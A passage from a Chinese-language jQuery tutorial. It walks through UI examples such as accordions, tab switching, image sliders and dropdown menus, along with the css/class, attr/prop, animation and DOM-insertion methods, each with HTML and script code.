        <li><a href="#"><img src="images/02.jpg" alt=""/></a></li>
        <li><a href="#"><img src="images/03.jpg" alt=""/></a></li>
        <li><a href="#"><img src="images/04.jpg" alt=""/></a></li>
        <li><a href="#"><img src="images/05.jpg" alt=""/></a></li>
        <li><a href="#"><img src="images/06.jpg" alt=""/></a></li>
    </ul>
</div>
```
* jq 代码
```
<script src="../jquery-1.12.4.js"></script>
<script>
$(function () {
    var $li = $('.wrap>ul>li')
    $li.mouseenter(function () {
        $(this).css('opacity',1).siblings().css('opacity',0.4)
    });

    $('.wrap').mouseleave(function () {
        $(this).find('li').css('opacity',1)
    })
})

</script>
```
>[success] # 手风琴
![](https://box.kancloud.cn/c8dd4897eb3d8e787ffa04f96ad196f6_202x271.png)

>[danger] ##### 代码
![](https://box.kancloud.cn/da7553534f28282e26f0c155769f9ec3_729x90.png)
```
1.找到li标签添加事件
2.让li标签中的div 显示隐藏
3.在找到被点击li的兄弟标签隐藏
```
* html
```
    <style type="text/css">
        *{
            padding: 0;margin: 0;
        }
        ul{
            list-style: none;
        }
        .parentWarp{
            width: 200px;
            text-align: center;
        }
        .menuGroup{
            border: 1px solid #999;
            background-color:#b1ecf8 ;
        }
        .groupTitle{
            display: block;
            height: 20px;
            line-height: 20px;
            font-size: 16px;
            border-bottom:1px solid #ccc;
            cursor:pointer;
        }
        .menuGroup > div {
            height: 200px;
            background-color:#fff;
            display:none;
        }
    </style>
</head>
<body>
<ul class="parentWarp">
    <li class="menuGroup">
        <span class="groupTitle">标题一</span>
        <div>标题一的内容</div>
    </li>
    <li class="menuGroup">
        <span class="groupTitle">标题二</span>
        <div>标题二的内容</div>
    </li>
    <li class="menuGroup">
        <span class="groupTitle">标题三</span>
        <div>标题三内容</div>
    </li>
</ul>
```
* jq
```
<script src="../jquery-1.12.4.js"></script>
<script>
$(function () {
    var $li = $('.parentWarp>.menuGroup')
    $li.click(function () {
        $(this).children('div').show().parent().siblings().children('div').hide()
        
      //$(this).next().slideDown(200).parent().siblings().children("div").slideUp(200);

    })

})

</script>
```
>[success] # 淘宝小广告案例
![](https://box.kancloud.cn/229686f7c579b023ebf8c33479c5985a_337x273.png)

>[danger] ##### 代码
```
1.选中后li 利用index 找到对应的图片位置
```
* html
```
    <style>
        *{
            margin: 0px;
            padding: 0px;
        }
        ul{
            list-style: none;
        }
        a{
            text-decoration: none;
        }
        .wrapper{
            width: 298px;
            height: 248px;
            margin: 100px auto 0;
            border: 1px solid pink;
            overflow: hidden;
        }

        #left, #center, #right {
            float: left;
        }

        #left li, #right li {
            background: url(images/lili.jpg) repeat-x;
        }
        #left li a, #right li a {
            display: block;
            width: 48px;
            height: 27px;
            border-bottom: 1px solid pink;
            line-height: 27px;
            text-align: center;
            color: black;
        }
        #left li a:hover, #right li a:hover {
            background-image: url(images/abg.gif);
        }

        #center {
            border-left: 1px solid pink;
            border-right: 1px solid pink;
        }
    </style>
</head>
<body>
<div class="wrapper">

    <ul id="left">
        <li><a href="#">女靴</a></li>
        <li><a href="#">雪地靴</a></li>
    </ul>
    <ul id="center">
        <li><a href="#"><img src="images/女靴.jpg" width="200" height="250"/></a></li>
        <li><a href="#"><img src="images/雪地靴.jpg" width="200" height="250"/></a></li>
        <li><a href="#"><img src="images/冬裙.jpg" width="200" height="250"/></a></li>
        <li><a href="#"><img src="images/呢大衣.jpg" width="200" height="250"/></a></li>
    </ul>
    <ul id="right">
        <li><a href="#">冬裙</a></li>
        <li><a href="#">呢大衣</a></li>
    </ul>

</div>
```
* jq
```
<script src="../jquery-1.12.4.js"></script>
<script>
    $(function () {

        //找不到对象
        $(function () {
            $("#left>li").mouseenter(function () {
                $("#center>li:eq(" + $(this).index() + ")").show().siblings().hide();
            });
            $("#right>li").mouseenter(function () {
                $("#center>li").eq($(this).index() + 2).show().siblings().hide();
            });
        })
    });
</script>
```
[TOC]
>[success] # jquery css/class 操作
```
1.css(name, value);
2.name：需要设置的样式名称  ， value：对应的样式值
3.设置操作的时候，如果是多个元素，那么给所有的元素设置相同的值
4.获取操作的时候，如果是多个元素，那么只会返回第一个元素的值。
5.class 分别对应着添加 移除 判断 三种
```
>[success] # css -- 简单操作入门

|    | 用法   |描述    |
| --- | --- | --- |
| .css(stytleName, value)   |  $('li').css('backgroudColor','pink')   |  .name：需要设置的样式名称  ， value：对应的样式值，给一组标签赋值相同的样式  |
|.css(obj)|$("li").css({backgroundColor:"pink",color: "red",});|obj 是一组样式的对象的集合|
|.css(name)| $('li').css('backgroudColor')   |name是要获取的jq对象标签中对应的属性值，如果是一组标签只会返回第一个|

>[danger] ##### 给一组标签赋值/给一组标签单个赋值
```
1.如何给jq对象从修改多个样式，或者给指定jq中的特定位置赋值
```
* 赋值多个样式两种方法
```
<!--通用的html-->
<ul>
    <li>521</li>
    <li>1314</li>
    <li>886</li>
    <li>553</li>
</ul>
```
![](https://box.kancloud.cn/dd56c55fdf36bf9dead0e4ad56345fdb_222x123.png)
```
// 第一种链式调用一组标签赋值多个样式
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $('li').css('backgroundColor','pink').css('color','red')
    })
</script>

// 第二种利用对象
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $('li').css({
        			'backgroundColor':'pink',
                     'color':'red'
                    })
    })
</script>
```
![](https://box.kancloud.cn/82e49ef91a3223281100d439824530c4_187x111.png)
* 给特定的样式赋值的方法
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $('li').eq(1).css('backgroundColor','pink')
    })
</script>
```
>[danger] ##### 获取标签样式值
```
// 设置操作的时候：会给jq内部的所有对象都设置上相同的值。
// 获取的时候：只会返回第一个元素对应的值。
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $('li').css({'backgroundColor':'pink'})
        console.log($('li').css('background'))

    })
</script>
```
>[success] # class 操作

|    |  用法  |描述    |
| --- | --- | --- |
|addClass(“name”);    | $(“div”).addClass(“one”); |   添加class 样式 |
|removeClass(“name”);|$(“div”).removeClass(“one”);|移除class样式|
|hasClass(“name”)   |   $(“div”).hasClass(“one”); |  判断class样式是否存在  |
|toggleClass(“name”);   | $(“div”).toggleClass(“one”);   |  name:需要切换的样式类名，如果有，移除该样式，如果没有，添加该样式。  |

>[danger] ##### 添加 -- addClass 

![](https://box.kancloud.cn/7130f6440035af947ddea24859d1d15e_651x339.png)

* html
```
<ul>
    <li>521</li>
    <li>1314</li>
    <li>886</li>
    <li>553</li>
</ul>
```
* jquery 
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        // 添加一个类
        $('li').addClass('addclass1').addClass('addclass2').addClass('addclass3')
    })
</script>
```
>[danger] ##### removeClass
![](https://box.kancloud.cn/bf8260500a5bd89e77847ae41c369cb6_469x360.png)
* jquery
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        // 添加一个类
        $('li').addClass('addclass1').addClass('addclass2').addClass('addclass3');
        $('li').removeClass('addclass1')
    })
</script>
```
>[danger] ##### hasClass 判断时候存在
```
<ul>
    <li>521</li>
    <li class="aa">1314</li>
    <li>886</li>
    <li>553</li>
</ul>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        // 添加一个类
        $('li').addClass('addclass1').addClass('addclass2').addClass('addclass3');
        var $li = $('li').hasClass('aa')
        console.log($li)
    })
</script>

打印结果：
true
```
>[danger] ##### toggleClass 如果有，就移除他
```
<ul>
    <li>521</li>
    <li>1314</li>
    <li>886</li>
    <li>553</li>
</ul>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        // 添加一个类
      $('li').toggleClass('aa')
    })
</script>
```
>[success] # tab -- 栏切换
```
1.给选中的标签增加active 显示，其他的兄弟标签去除active
2.获取当前选中标签的位置
3.通过eq 给 展示内容框显示属性
```
>[danger] ##### html 代码

```
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        ul{
            list-style: none;
        }
        .wrapper{
            width: 1000px;
            height:475px;
            margin: 0 auto;
            margin-top: 100px;
        }
        .tab{
            border: 1px solid #ddd;
            border-bottom: 0;
            height: 36px;
            width: 320px;
        }
        .tab li {
            position: relative;
            float: left;
            width: 80px;
            height: 34px;
            line-height: 34px;
            text-align: center;
            cursor: pointer;
            border-top: 4px solid #fff;
        }
        .tab span {
            position: absolute;
            right: 0;
            top: 10px;
            background: #ddd;
            width: 1px;
            height: 14px;
            overflow: hidden;
        }
        .products {
            width: 1002px;
            border: 1px solid #ddd;
            height: 476px;
        }

        .products .main {
            float: left;
            display: none;
        }

        .products .main.selected {
            display: block;
        }

        .tab li.active {
            border-color: red;
            border-bottom: 0;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <ul class="tab">
        <li class="tab-item active">国际大牌<span>◆</span></li>
        <li class="tab-item">国妆名牌<span>◆</span></li>
        <li class="tab-item">清洁用品<span>◆</span></li>
        <li class="tab-item">男士精品</li>
    </ul>
    <div class="products">
        <div class="main selected"><a href="###"><img src="imgs/guojidapai.jpg" alt=""></a></div>
        <div class="main"><a href="###"><img src="imgs/guozhuangmingpin.jpg" alt=""></a></div>
        <div class="main"><a href="###"><img src="imgs/qingjieyongpin.jpg" alt=""></a></div>
        <div class="main"><a href="###"><img src="imgs/nanshijingpin.jpg" alt=""></a></div>
    </div>
</div>
```
>[danger] ##### jq
```
<script src="../jquery-1.12.4.js"></script>
<script>


    $(function () {
        $('.tab-item').mouseenter(function () {
            // 选中的增加active。其他的兄弟清除active
            $(this).addClass('active').siblings().removeClass('active')
            // 获取当前选中标签的位置
            var index = $(this).index();
            $(".main").eq(index).addClass("selected").siblings().removeClass("selected");

        })
    })
</script>
```
>[success] # 自定义属性attr/prop
```
1.对于布尔类型的属性，不要attr方法，应该用prop方法 prop用法跟attr方法一样。
2.布尔类型类似 checked selected
```
>[danger] ##### attr / prop 属性表格总结


|    |用法    |说明    |
| --- | --- | --- |
|  .attr(name, values)  |$("img").attr('title','错错错')    |给标签定义属性用法和css类似第一个参数是属性名称，第二个参数是属性value    |
|  .attr(obj)  |$("img").attr({'title':'错错错')}    |给以传入对象    |
|  .attr(name)  | $("img").attr("src")   |获取标签的属性的value    |
|  .removeAttr(name)  | $("img").removeAttr("src")   |删除标签    |
|  .prop(name, value)  |$("#ck").prop('checked',true)    |  对于布尔类型的属性，不要attr方法，应该用prop方法 prop用法跟attr方法一样。  |
|  .prop(name)  |$("#ck").prop("checked")   |获取标签的属性的value ,布尔值   |
|  .removeProp(name)  |$("#ck").removeProp("checked")   |删除标签  |
>[danger] ##### attr 用法
```
<img src="04.gif" alt="突破了" title="对对对">
<script src="jquery-1.12.4.js"></script>
<script>

    $(function () {
        // 获取img 标签属性
        var $img = $('img').attr('alt')
        console.log($img)
        // 给img 标签赋值属性
        var $ixd = $('img').attr('index',1)
    })
</script>

打印结果：
突破了
```
* 实现效果
![](https://box.kancloud.cn/eec5b9e0b50bed58b737800e9443ad6a_493x102.png)

>[danger] ##### porp 用法
![](https://box.kancloud.cn/55e5f11a55ecd0983dcd5207f2444c39_166x44.png)
```
<input type="button" value="选中">
<input type="button" value="不选中">
<input type="checkbox" id="ck">
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>
  
  
  //对于布尔类型的属性，不要attr方法，应该用prop方法 prop用法跟attr方法一样。
  $(function () {
    $("input").eq(0).click(function () {
      $("#ck").prop("checked", true);
    });
  
    $("input").eq(1).click(function () {
      $("#ck").prop("checked", false);
    });
  });
</script>
```
>[success] #  点击小图展示大图
```
1. 做return flase 防止连接跳转
```
![](https://box.kancloud.cn/90f37abebbcd86fff2b658a872a3fc17_498x382.png)

>[danger] ##### 代码
```
    <title>Title</title>
    <style type="text/css">
        body {
            font-family: "Helvetica", "Arial", serif;
            color: #333;
            background-color: #ccc;
            margin: 1em 10%;
        }

        h1 {
            color: #333;
            background-color: transparent;
        }

        a {
            color: #c60;
            background-color: transparent;
            font-weight: bold;
            text-decoration: none;
        }

        ul {
            padding: 0;
        }

        li {
            float: left;
            padding: 1em;
            list-style: none;
        }

        #imagegallery {

            list-style: none;
        }

        #imagegallery li {
            margin: 0px 20px 20px 0px;
            padding: 0px;
            display: inline;
        }

        #imagegallery li a img {
            border: 0;
        }
    </style>
</head>
<body>
<ul id="imagegallery">
    <li>
        <a href="images/1.jpg" title="图1">
            <img src="images/1-small.jpg" width="100" alt="大图一"/>
        </a>
    </li>
    <li>
        <a href="images/2.jpg" title="图2">
            <img src="images/2-small.jpg" width="100" alt="大图2"/>
        </a>
    </li>
    <li>
        <a href="images/3.jpg" title="图1">
            <img src="images/3-small.jpg" width="100" alt="大图3"/>
        </a>
    </li>
    <li>
        <a href="images/4.jpg" title="图1">
            <img src="images/4-small.jpg" width="100" alt="大图4"/>
        </a>
    </li>
</ul>
<div style="clear:both"></div>

<img id="image" src="images/placeholder.png" alt="" width="450px"/>

<p id="des">选择一个图片</p>
```
* jq
```
<script src="../jquery-1.12.4.js"></script>
<script>
    $(function () {
        $('#imagegallery a').click(function () {
            var $ahref = $(this).attr('href')
            console.log($ahref)
            $('#image').attr('src', $ahref)
            var title = $(this).attr("title");
            $("#des").text(title);
            // 不要连接跳转
            return false
        });
    })
</script>
```
>[success] # 实现全选和单选
```
1.分析要处理的功能有两个一个是全选，一个是单选
2.单选的时候利用：checked 根据判断单选长度和单选框是否一致，判断是否全选
```
![](https://box.kancloud.cn/7c0ead093d01c12e7ae59930e23d1299_210x87.png)

>[danger] ##### 代码
* html
```
<div class="wrap">
    <table>
        <thead>
        <tr>
            <th>
                <input type="checkbox" id="j_cbAll"/>
            </th>
            <th>菜名</th>
            <th>饭店</th>
        </tr>
        </thead>
        <tbody id="j_tb">
        <tr>
            <td>
                <input type="checkbox"/>
            </td>
            <td>红烧肉</td>
            <td>测试饭店</td>
        </tr>
        <tr>
            <td>
                <input type="checkbox"/>
            </td>
            <td>西红柿鸡蛋</td>
            <td>测试饭店</td>
        </tr>
        </tbody>
    </table>
</div>

```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>

    $(function () {

        $('#j_cbAll').click(function () {
            $('#j_tb input').prop("checked", $(this).prop('checked'));
        })

        $('#j_tb input').click(function () {
            // 如果被选中的长度 等于所有input 则all 被选中
            if($('#j_tb input:checked').length ==  $("#j_tb input").length){
                $('#j_cbAll').prop('checked',true)
            }else{
                $('#j_cbAll').prop('checked',false)

            }
        })
    })
</script>
```
[TOC]
>[success] # 显示隐藏和动画效果
```
1.show/hide  --- 控制display：none 显示隐藏对话框
2.slideDown/slideUp --- 划入划出显示动画
3.fadeIn/fadeOut  --- 淡入淡出显示动画
4.animate --- 自定义动画
5.一定要用stop()停止动画效果 例如：$(this).children('ul').stop().slideDown()
 先停止这个标签的所有动画效果在往后执行
``` 
>[success] # show/hide --- 显示隐藏动画

|    | 用法   |效果    |
| --- | --- | --- |
| .show([speed],[callback])   | $("div").show()   |  1.两个可选参数，不写参数就是普通的对话框隐藏显示效果，填写第一个参数控制速度的，动画效果会改变长宽，透明度效果显示出来，第二个参数是回调函数|
|  .hide([speed],[callback])  | $("div").hide()    |   同上 |

>[danger] ##### show/hide 使用效果
```
1.speed:动画的持续时间  可以是毫秒值 还可以是固定字符串，fast:200ms   normal:400ms   slow:600
2.回调函数是在动画执行后执行效果
```
* html
```
    <style>
        div {
            width: 400px;
            height: 400px;
            background-color: pink;
            display: none;
        }
    </style>
</head>
<body>
<input type="button" value="显示">
<input type="button" value="隐藏">
<div></div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>

    $(function () {
        $('input').eq(0).click(function () {
            $('div').show()
        })
        $('input').eq(1).click(function () {
            $('div').hide()
        })

    })
</script>
```
>[success] # slideDown/slideUp -- 滑入滑出

|    | 用法   |效果    |
| --- | --- | --- |
| .slideDown([speed],[e],[fn])   |$('div') .slideDown()    |1. 三个参数，第一个参数speed控制速度，e控制"swing" - 在开头/结尾移动慢，在中间移动快，"linear" - 匀速移动，第三个参数回调函数   |
|  .slideUp()    |  $('div') .slideUp()  | 1.同上   |
|  .slideToggle()  |$('div').slideToggle()    |  1. 如果是滑入状态，就执行滑出的动画|

>[danger] #####  slideDown/slideUp  -- 滑入滑出
```
1.slideDown/slideUp/slideToggle 滑入/滑出/如果是滑入状态，就执行滑出的动画
2.e控制"swing" - 在开头/结尾移动慢，在中间移动快，"linear" - 匀速移动，第三个参
 数回调函数
3.从上到下显示
```
* html
```
    <style>
        div {
            width: 400px;
            height: 400px;
            background-color: pink;
            display: none;
        }
    </style>
</head>
<body>
<input type="button" value="显示">
<input type="button" value="隐藏">
<input type="button" value="切换">

<div></div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>

    $(function () {
        $('input').eq(0).click(function () {
            $('div').slideDown()
        })
        $('input').eq(1).click(function () {
            $('div').slideUp()
        })
        $('input').eq(2).click(function () {
            $('div').slideToggle()
        })
    })
</script>
```
>[success] # fadeIn/fadeOut/fadeToggle  --- 淡入/淡出/切换

|    |  用法  |效果    |
| --- | --- | --- |
|.fadeIn([speed],[e],[fn])    |$("div").fadeIn()    | 1.画面淡入淡出效果，如果不填写speed参数就没有淡入淡出效果 ，e控制"swing" - 在开头/结尾移动慢，在中间移动快，"linear" - 匀速移动，第三个参数回调函数  |
| .fadeOut([speed],[e],[fn]) | $("div").fadeOut();   |  同上  |
| .fadeToggle()  |  $('div').fadeToggle();   |  1.如果是滑入状态，就执行滑出的动画，  |

>[danger] ##### fadeIn/fadeOut/fadeToggle  --- 淡入/淡出/切换
```
1.如果不设置 speed 参数就没有淡入淡出效果
```
* html
```
    <style>
        div {
            width: 400px;
            height: 400px;
            background-color: pink;
            display: none;
        }
    </style>
</head>
<body>
<input type="button" value="显示">
<input type="button" value="隐藏">
<input type="button" value="切换">

<div></div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>

    $(function () {
        $('input').eq(0).click(function () {
            $('div').fadeIn(1000)
        })
        $('input').eq(1).click(function () {
            $('div').fadeOut(2000)
        })
        $('input').eq(2).click(function () {
            $('div').fadeToggle()
        })
    })
</script>
```
>[success] # animate 自定义参数
```
1.第一个参数：对象，里面可以传需要动画的样式
2.第二个参数：speed 动画的执行时间
3.第三个参数：动画的执行效果
4.第四个参数：回调函数
```

|    | 用法   |效果    |
| --- | --- | --- |
|  .animate  | $("#box1").animate(obj,[speed],[e],[fn] );   |1.第一参数动画效果对象，第二个参数控制速出，第三个参数控制动画效果swing，秋千效果，匀速效果linear|
>[danger] ##### 案例
* html
```
  <style>
    div {
      width: 100px;
      height: 100px;
      background-color: pink;
      position: absolute;
    }
    #box2 {
      background-color: blue;
      margin-top: 150px;
    }
    
    #box3 {
      background-color: yellowgreen;
      margin-top: 300px;
    }
  </style>
</head>
<body>
<input type="button" value="开始">
<input type="button" value="结束">
<div id="box1"></div>
<div id="box2"></div>
<div id="box3"></div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    $("input").eq(0).click(function () {
      
      //第一个参数：对象，里面可以传需要动画的样式
      //第二个参数：speed 动画的执行时间
      //第三个参数：动画的执行效果
      //第四个参数：回调函数
      $("#box1").animate({left:800}, 8000);
      
      //swing:秋千 摇摆
      $("#box2").animate({left:800}, 8000, "swing");
      
      //linear:线性 匀速
      $("#box3").animate({left:800}, 8000, "linear", function () {
        console.log("hahaha");
      });
    })
  });
</script>
```

>[success] # sileDown/sldeUp -- 下拉菜单
```
1.一定要用stop()停止动画效果 例如：$(this).children('ul').stop().slideDown()
 先停止这个标签的所有动画效果在往后执行
```
![](https://box.kancloud.cn/1569852814f5b973b06ba3c282b94c1e_399x140.png)

>[danger] ##### 代码
```
1. 这个标签下的儿子标签 显示
```
* html
```
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
        }

        ul {
            list-style: none;
        }

        .wrap {
            width: 330px;
            height: 30px;
            margin: 100px auto 0;
            padding-left: 10px;
            background-image: url(imgs/bg.jpg);
        }

        .wrap li {
            background-image: url(imgs/libg.jpg);
        }

        .wrap > ul > li {
            float: left;
            margin-right: 10px;
            position: relative;
        }

        .wrap a {
            display: block;
            height: 30px;
            width: 100px;
            text-decoration: none;
            color: #000;
            line-height: 30px;
            text-align: center;
        }

        .wrap li ul {
            position: absolute;
            top: 30px;
            display: none;
        }
    </style>
</head>
<body>
<div class="wrap">
    <ul>
        <li>
            <a href="javascript:void(0);">一级菜单1</a>
            <ul class="ul">
                <li><a href="javascript:void(0);">二级菜单11</a></li>
                <li><a href="javascript:void(0);">二级菜单12</a></li>
                <li><a href="javascript:void(0);">二级菜单13</a></li>
            </ul>
        </li>
        <li>
            <a href="javascript:void(0);">一级菜单2</a>
            <ul class="ul">
                <li><a href="javascript:void(0);">二级菜单21</a></li>
                <li><a href="javascript:void(0);">二级菜单22</a></li>
                <li><a href="javascript:void(0);">二级菜单23</a></li>
            </ul>
        </li>
        <li>
            <a href="javascript:void(0);">一级菜单3</a>
            <ul class="ul">
                <li><a href="javascript:void(0);">二级菜单31</a></li>
                <li><a href="javascript:void(0);">二级菜单32</a></li>
                <li><a href="javascript:void(0);">二级菜单33</a></li>
            </ul>
        </li>
    </ul>
</div>
```
* jq
```
<script src="../jquery-1.12.4.js"></script>
<script>
$(function () {
    $('.wrap>ul>li').mouseenter(function () {
        // 这个标签下的儿子标签 显示
        $(this).children('ul').stop().slideDown()
    })

    $('.wrap>ul>li').mouseleave(function () {
        // 这个标签下的儿子标签 显示
        $(this).children('ul').stop().slideUp()
    })
})
</script>
```
[TOC]
>[success] # 京东淡入淡出的滚动图
![](https://box.kancloud.cn/7162dfab5121101a9f5e2bf52c7d3f49_830x373.png)
```
1.首先设置一个计数器，用来计数当前图片是第几个
2.判断增加的最大数不能超过图片总数
3.最数不能等于-1
4.当达到特定指的时候给他们重新赋值
5.点击脚标思路就是获得脚标的index（）位置
6.自动滚动加动画效果
```
>[danger] ##### 代码
* html
```
<style>
    * {
        margin: 0;
        padding: 0;
        list-style: none;
    }

    .slider {
        height: 340px;
        width: 790px;
        margin: 100px auto;
        position: relative;
    }
    /*从上往下依次向上浮动，形成迭代覆盖*/
    .slider li {
        position: absolute;
        display: none;
    }
    .slider li:first-child {
        display: block;
    }

    .arrow {
        display: none;
    }

    .slider:hover .arrow {
        display: block;
    }
    .arrow-left,
    .arrow-right {
        font-family: "SimSun", "宋体";
        width: 30px;
        height: 60px;
        background-color: rgba(0, 0, 0, 0.1);
        position: absolute;
        top: 50%;
        margin-top: -30px;
        cursor: pointer;
        text-align: center;
        line-height: 60px;
        color: #fff;
        font-weight: 700;
        font-size: 30px;
    }
    .arrow-left:hover,
    .arrow-right:hover {
        background-color: rgba(0, 0, 0, .5);
    }

    .arrow-left {
        left: 0;
    }

    .arrow-right {
        right: 0;
    }

    .count{
        position: absolute;
        bottom: 0px;
        left: 500px;
    }
    .count span{
        margin-right:10px ;
        font-size: 16px;
        background-color: #E9FFB7;
        line-height: 16px;
        text-align: center;
        display: inline-block;
        width: 20px;
        cursor: pointer;
    }

</style>
<body>
<div class="slider">
    <ul>
        <li><a href="#"><img src="images/1.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/2.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/3.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/4.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/5.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/6.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/7.jpg" alt=""></a></li>
        <li><a href="#"><img src="images/8.jpg" alt=""></a></li>
    </ul>
    <!--箭头-->
    <div class="arrow">
        <span class="arrow-left">&lt;</span>
        <span class="arrow-right">&gt;</span>
    </div>
    <!--标号-->
    <div class="count">
        <span>1</span>
        <span>2</span>
        <span>3</span>
        <span>4</span>
        <span>5</span>
        <span>6</span>
        <span>7</span>
        <span>8</span>
    </div>
</div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        var count = 0
        //  点击右侧按钮
        $('.arrow-right').click(function () {
            count++
            if(count == $(".slider li").length){
                count=0;
            }
            $('.slider li').eq(count).fadeIn().siblings('li').fadeOut();
        })
        //  点击左侧按钮
        $('.arrow-left').click(function () {
            count--
            if(count == -1){
                count=$(".slider li").length - 1;
            }
            $('.slider li').eq(count).fadeIn().siblings('li').fadeOut();
        })

        $('.count span').click(function () {
             count = $(this).index()
            $('.slider li').eq(count).fadeIn().siblings('li').fadeOut();

        })
    })
</script>
```
>[success] # 手风琴效果
![](https://box.kancloud.cn/8ead7f5b643eae7915a952e7e4f6149d_1272x429.png)
```
1.增加stop 停止事件
```
>[danger] ##### 代码
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        ul {
            list-style: none;
            width: 1300px;
        }

        #box {
            width: 1200px;
            height: 400px;
            border: 2px solid red;
            margin: 100px auto;
        }

        #box li {
            width: 240px;
            height: 400px;
            /*border: 1px solid #000;*/
            float: left;
        }

    </style>
</head>
<body>
<div id="box">
    <ul>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
    </ul>
</div>
<script src="../jquery-1.12.4.js"></script>
<script>
    var $li = $("#box li");
    // 给每一个li 设置背景图片
    for (var i = 0; i < $li.length; i++) {
        $li.eq(i).css("backgroundImage", "url(images/" + (i + 1) + ".jpg)");
    }
    //给所有的li注册鼠标经过事件
    $li.mouseenter(function () {
        $(this).stop().animate({width:800}).siblings().stop().animate({width:100});
    }).mouseleave(function () {
        $li.stop().animate({width:240});
    });
</script>
```

>[success] # 创建兄弟和子节点

|    |用法    |解释    |
| --- | --- | --- |
| .append()   |  $("div").append($("p"))  | 1.在对应的父类中假如子孙节点，向后插   |
| .appendTo()   | $("p").appendTo($("div"))   |  1.把某个子孙节点加到父节点之中，向后插  |
| .prepend()   | $("div").prepend($("p"))   |   1.在对应的父类中假如子孙节点，向前插   |
| .prependTo()   |  $("p").prependTo($("div"))  |1.把某个子孙节点加到父节点之中，向前插 |
| .after()   |  $('div').after($("p"))  | 1.兄弟标签在后面加   |
| .before()   |   $('div').before($("p")) | 1.兄弟标签在前面加   |
>[danger] ##### 案例
```
  <style>
    div {
      width: 400px;
      height: 400px;
      background-color: pink;
    }
  </style>
</head>
<body>

<div id="box">
  我是内容
</div>

<p>我是外面的p元素</p>

<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    
//    //创建jq对象
//    var $li = $('<a href="http://web.itcast.cn" target="_blank">传智大前端</a>');
//    console.log($li);
//
//
//    $("div").append('<a href="http://web.itcast.cn" target="_blank">传智大前端</a>');
    
     // 添加到子元素的最后面
        // 把页面标签加入指定标签中
        $("div").append($("p"))
        // 自己创建标签加入页面中
        $("div").append($("<p>我在</p>"))
        // 把什么加入到什么里面
        $("p").appendTo($("div"));

        $("div").prepend($("p"));
        $("p").prependTo($("div"));
    
       $('div').after($("p"));
       $('div').before($("p"));
    
    
  });
</script>
```
>[success] # 左面的到右面的
```
1.原理是创建两个多选的 复选框
2.利用append 添加节点
```
![](https://box.kancloud.cn/80749033956e461521c2da57ad738a93_496x278.png)

>[danger] ##### 代码
* html
```
    <style>
        select {
            width: 200px;
            background-color: teal;
            height: 200px;
            font-size: 20px;
        }

        .btn-box {
            width: 30px;
            display: inline-block;
            vertical-align: top;
        }
    </style>
</head>
<body>
<h1>城市选择：</h1>
<select id="src-city" name="src-city" multiple>
    <option value="1">北京</option>
    <option value="2">上海</option>
    <option value="3">深圳</option>
    <option value="4">广州</option>
    <option value="5">西红柿</option>
</select>
<div class="btn-box">
    <!--实体字符-->
    <button id="btn1"> &gt;&gt; </button>
    <button id="btn2"> &lt;&lt; </button>
    <button id="btn3"> &gt;</button>
    <button id="btn4"> &lt; </button>
</div>
```
* jq
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $("#btn1").click(function () {
            $("#src-city>option").appendTo("#tar-city");
        });

        $("#btn2").click(function () {
            $("#src-city").append($("#tar-city>option"));
        });
        $("#btn3").click(function () {
            $("#src-city>option:selected").appendTo("#tar-city");
        });

        $("#btn4").click(function () {
            $("#src-city").append($("#tar-city>option:selected"));
        });
    });
</script>
```
>[success] # 案例效果
![](https://box.kancloud.cn/003638bd13f8c2b943adba232faee0c2_716x303.png)
```
  <style>
    * {
      margin: 0;
      padding: 0;
    }
    
    ul {
      list-style: none;
    }
    
    .box {
      width: 600px;
      margin: 100px auto;
      border: 1px solid #000;
      padding: 20px;
    }
    
    textarea {
      width: 450px;
      height: 160px;
      outline: none;
      resize: none;
    }
    
    ul {
      width: 450px;
      padding-left: 80px;
    }
    
    ul li {
      line-height: 25px;
      border-bottom: 1px dashed #cccccc;
    }
    
    input {
      float: right;
    }
  
  
  </style>
</head>
<body>
<div class="box" id="weibo">
  <span>微博发布</span>
  <textarea name="" id="txt" cols="30" rows="10"></textarea>
  <button id="btn">发布</button>
  <ul id="ul">
  
  </ul>
</div>

<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    $("#btn").click(function () {
      
      if($("#txt").val().trim().length == 0) {
        return;
      }
      //就是文本框的值
      $("<li></li>").text($("#txt").val()).prependTo("#ul");
  
      $("#txt").val("");
    })
    
  });
</script>
```
>[success] # 删除和复制
```
1.empty() --- 清除选中标签内的内容，也就是所有子节点
2.remove() --- 全部清除
3.clone() --- 复制标签，默认为flase ，flase不会复制事件，只会复制内容，true相反
```
>[danger] ##### 案例
```
<div>
  <p>1111</p>
  <p>2222</p>
</div>

<p class='des'>我是外面的p元素</p>


<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    
    $(".des").click(function () {
      alert("hehe");
    })
    
    //可以清空一个元素的内容
    
    //内存泄露：
    //$("div").html("");
    //清理门户（）
    //$("div").empty();
    
    //
    //$("div").remove();
    
    //false:不传参数也是深度复制,不会复制事件
    //true:也是深复制，会复制事件
